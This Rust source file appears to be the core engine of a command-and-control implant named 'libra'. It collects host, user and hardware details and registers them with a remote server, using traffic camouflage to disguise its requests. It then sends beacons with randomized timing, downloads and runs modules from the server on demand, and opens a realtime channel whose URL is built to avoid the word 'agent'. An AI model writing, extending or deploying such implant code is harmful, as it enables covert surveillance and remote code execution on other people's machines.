use serde_json::Value;

use libra_crypto::AgentCrypto;
use libra_comm::http::HttpCommunicator;

use crate::config::ConfigManager;
use crate::engine::heartbeat::{heartbeat_tick, jittered_interval};
use crate::module_manager::{ModuleManager, run_module};

mod heartbeat;
mod utils;

pub struct AgentEngine {
    config: ConfigManager,
    crypto: AgentCrypto,
    http: Option<HttpCommunicator>,
    agent_id: String,
    /// Per-session channel token issued at registration (rotates per session).
    session_token: String,
    /// 流量伪装 profile（单入口/壳字段/UA/padding），注册响应下发。
    profile: Option<libra_common::models::ProfileTransform>,
    /// Profile paths adopted at registration (empty = use build-time paths).
    heartbeat_path: String,
    result_path: String,
}

impl AgentEngine {
    pub fn new(config: ConfigManager) -> Self {
        Self {
            config,
            crypto: AgentCrypto::new(),
            http: None,
            agent_id: String::new(),
            session_token: String::new(),
            profile: None,
            heartbeat_path: String::new(),
            result_path: String::new(),
        }
    }

    pub fn agent_id(&self) -> &str { &self.agent_id }

    // ── Main entry point ─────────────────────────────────────────────

    pub async fn run(&mut self) -> Result<(), String> {
        loop {
            match self.run_once().await {
                // 会话丢失（服务端重启/重启后 token 失效）：重置通道状态，
                // 重新走注册流程（新 token + 可能的新会话密钥）。crypto 的
                // RSA keypair 与已有 session key 保留——服务端若仍持有旧
                // session key 则复用（hasSessionKey=true），否则重新下发。
                Err(e) if e == "SESSION_LOST" => {
                    libra_common::dlog!("[INFO] session lost — re-registering");
                    self.http = None;
                    self.session_token.clear();
                    self.profile = None;
                    continue;
                }
                other => return other,
            }
        }
    }

    async fn run_once(&mut self) -> Result<(), String> {
        self.crypto.generate_key_pair();

        let hw = libra_platform::hardware::collect();
        let hw_json = libra_platform::hardware::serialize(&hw);

        libra_modules::recon::NetworkInfo::warmup_geo().await;

        let mut http = HttpCommunicator::new(
            &self.config.server_url,
            &self.config.register_path,
            &self.config.heartbeat_path,
            &self.config.result_path,
        );

        // 构建时注入的流量伪装（UA/附加头/路径后缀）在注册前生效
        // （注册请求本身也带伪装）；注册后服务端 profile 覆盖。
        http.set_build_style(
            self.config.user_agents.clone(),
            self.config.extra_headers.clone(),
            self.config.path_suffixes.clone(),
        );
        // 服务端 RSA 公钥：注册混合加密
        if !self.config.server_public_key.is_empty() {
            http.set_server_public_key(self.config.server_public_key.clone());
        }

        let sys_json = libra_modules::recon::SystemInfo::collect();
        let sys: Value = serde_json::from_str(&sys_json).unwrap_or(Value::Null);
        let hostname = sys["hostname"].as_str().unwrap_or("unknown");
        let user_name = sys["userName"].as_str().unwrap_or("unknown");
        let os_version = sys["osVersion"].as_str().unwrap_or("unknown");
        let arch = sys["arch"].as_str().unwrap_or("unknown");

        let outcome = http.register(
            hostname, user_name, os_version, arch,
            self.crypto.rsa_public_key().unwrap_or(""),
            &self.config.beacon_secret,
            &hw_json,
            self.crypto.session_key().is_some(),
        ).await?;

        let agent_id = outcome.agent_id;
        let session_key = outcome.session_key;
        self.session_token = outcome.session_token.clone().unwrap_or_default();

        // 采用单入口流量伪装 profile（路径/壳字段/UA/padding）
        if let Some(p) = outcome.profile {
            self.profile = Some(p.clone());
            http.set_profile(p);
        }
        // 心跳节奏覆盖（服务端 profile 下发值优先于构建时值）
        if outcome.heartbeat_interval_ms > 0 {
            self.config.heartbeat_interval_ms = outcome.heartbeat_interval_ms;
        }
        if outcome.jitter_percent > 0.0 {
            self.config.jitter_percent = outcome.jitter_percent;
        }

        // Establish AES-256-GCM session key from the RSA-encrypted blob.
        if let Some(key) = session_key {
            if let Err(e) = self.crypto.set_session_key(&key) {
                libra_common::dlog!("[WARN] Failed to set session key: {}", e);
            } else {
                libra_common::dlog!("[INFO] AES-256-GCM session key established");
            }
        } else {
            libra_common::dlog!("[WARN] Server did not return a session key (encryption disabled)");
        }

        libra_common::dlog!("[INFO] registered | agent_id={} | hostname={}", agent_id, hostname);
        self.agent_id = agent_id;
        self.http = Some(http);

        self.main_loop().await
    }

    // ── Main event loop（本体零 WS：wsNeeded 只驱动 realtime 模块）────

    async fn main_loop(&mut self) -> Result<(), String> {
        let _http = self.http.as_ref().ok_or("HTTP not initialized")?;
        let agent_id = self.agent_id.clone();
        let server_url = self.config.server_url.clone();
        let register_path = self.config.register_path.clone();

        let hb_key = self.crypto.session_key();
        let hb_interval_ms = self.config.heartbeat_interval_ms;
        let hb_jitter = self.config.jitter_percent;
        let session_token = self.session_token.clone();
        let profile = self.profile.clone();

        // Cloud module manager — downloads modules on demand (shared with the
        // heartbeat task that executes one-shot tasks).
        let module_manager = std::sync::Arc::new(tokio::sync::Mutex::new(
            ModuleManager::new(
                &server_url, &register_path, &register_path, &register_path,
                agent_id.clone(), hb_key, Some(session_token.clone()),
            ),
        ));

        // WS 需求命令通道：true = 服务端要求实时通道（启动 realtime 模块）；
        // false = 释放（停止模块）。
        let (ws_cmd_tx, mut ws_cmd_rx) = tokio::sync::mpsc::unbounded_channel::<bool>();

        // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
        // with the session key, with per-tick jitter. Signals a re-register if
        // the session is lost (e.g. the server restarted).
        let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
        let hb_mm = module_manager.clone();
        let hb_reconnect = reconnect_tx.clone();
        let hb_ws_cmd = ws_cmd_tx.clone();
        // 主循环（realtime 模块管理）仍要使用这些值：spawn 前各留一份副本
        let hb_agent_id = agent_id.clone();
        let hb_server_url = server_url.clone();
        let hb_register_path = register_path.clone();
        let hb_session_token = session_token.clone();
        tokio::spawn(async move {
            let mut hb_http = HttpCommunicator::new(&hb_server_url, &hb_register_path, &hb_register_path, &hb_register_path);
            if !hb_session_token.is_empty() {
                hb_http.set_session_token(hb_session_token);
            }
            if let Some(p) = profile {
                hb_http.set_profile(p);
            }
            loop {
                match heartbeat_tick(&hb_http, &hb_agent_id, hb_key.as_ref(), &hb_mm).await {
                    Ok(ws_needed) => {
                        // 每个心跳都同步一次 WS 需求（幂等，服务端状态为准）
                        let _ = hb_ws_cmd.send(ws_needed);
                    }
                    Err(e) if e == "SESSION_LOST" => {
                        libra_common::dlog!("[WARN] session lost — triggering re-registration");
                        let _ = hb_reconnect.send(());
                        break;
                    }
                    _ => {}
                }

                // beacon sleep：块状抖动（普通 sleep，无镜像混淆）。
                let interval_ms = jittered_interval(hb_interval_ms, hb_jitter);
                tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
            }
        });

        // ── 主循环：realtime 模块生命周期管理 ──
        // wsNeeded=true → 下载并启动 realtime 模块（模块自建 WS 接管所有
        // WS 消息处理）；wsNeeded=false → 停止模块。幂等 + 状态跟踪，
        // 避免每个心跳重复调用。
        let mut realtime_started = false;
        let ws_url = self.ws_url_for(&agent_id);
        let session_key_b64 = hb_key.map(|k| {
            use base64::Engine as _;
            base64::engine::general_purpose::STANDARD.encode(k)
        });

        loop {
            tokio::select! {
                _ = reconnect_rx.recv() => {
                    libra_common::dlog!("[INFO] re-registering with server");
                    return Err("SESSION_LOST".into());
                }
                Some(need) = ws_cmd_rx.recv() => {
                    if need && !realtime_started {
                        let input = serde_json::json!({
                            "action": "start",
                            "wsUrl": ws_url,
                            "agentId": agent_id,
                            "sessionKey": session_key_b64.clone().unwrap_or_default(),
                            "sessionToken": session_token,
                            "serverUrl": server_url,
                            "registerPath": register_path,
                        });
                        let r = run_module(&module_manager, "realtime", input).await;
                        libra_common::dlog!("[realtime] start: {}", r);
                        realtime_started = r.contains("\"status\"");
                    } else if !need && realtime_started {
                        let r = run_module(&module_manager, "realtime",
                            serde_json::json!({ "action": "stop" })).await;
                        libra_common::dlog!("[realtime] stop: {}", r);
                        realtime_started = false;
                    }
                }
            }
        }
    }

    /// 实时通道 URL（/ws/realtime?channel=，无 agent 字样）。
    fn ws_url_for(&self, agent_id: &str) -> String {
        let (scheme, rest) = if self.config.server_url.starts_with("https://") {
            ("wss://", &self.config.server_url[8..])
        } else {
            ("ws://", &self.config.server_url[7..])
        };
        let host = rest.trim_end_matches('/');
        format!("{}{}/ws/realtime?channel={}", scheme, host, agent_id)
    }
}
